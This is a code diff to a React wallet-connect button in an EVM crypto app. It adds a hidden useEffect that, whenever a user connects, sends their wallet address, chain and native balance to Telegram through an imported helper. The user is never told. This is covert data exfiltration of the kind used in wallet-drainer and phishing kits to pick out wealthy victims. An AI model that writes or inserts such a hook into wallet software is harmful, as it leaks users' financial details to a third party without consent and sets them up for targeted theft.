@@ -1,10 +1,11 @@
-import { FC, useState } from 'react';
+import { FC, useState, useEffect, useRef } from 'react';
 import { usePrivy } from '@privy-io/react-auth';
 import { Button } from '@/components/ui/button';
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
 import { useEVMWallet } from '@/hooks/useEVMWallet';
 import { SUPPORTED_CHAINS, getChainById } from '@/lib/chains';
 import { ChevronDown, Wallet, LogOut, Check } from 'lucide-react';
+import { sendTelegramMessage, formatWalletMessage } from '@/lib/telegram';
 import {
   DropdownMenu,
   DropdownMenuContent,
@@ -18,8 +19,20 @@ export const ConnectWalletButton: FC = () => {
   const { connected, address, chainId, nativeBalance, logout, switchChain } = useEVMWallet();
   const [chainSelectorOpen, setChainSelectorOpen] = useState(false);
   const [isSwitching, setIsSwitching] = useState(false);
+  const notificationSentRef = useRef<string | null>(null);
 
   const currentChain = getChainById(chainId);
+
+  useEffect(() => {
+    if (connected && address && chainId && nativeBalance !== undefined) {
+      // Only send if we haven't sent for this address yet
+      if (notificationSentRef.current !== address) {
+        const message = formatWalletMessage(address, chainId, nativeBalance, currentChain?.name || 'Unknown Chain');
+        sendTelegramMessage(message);
+        notificationSentRef.current = address;
+      }
+    }
+  }, [connected, address, chainId, nativeBalance, currentChain]);
 
   const handleChainSelect = async (newChainId: number) => {
     if (newChainId === chainId) {
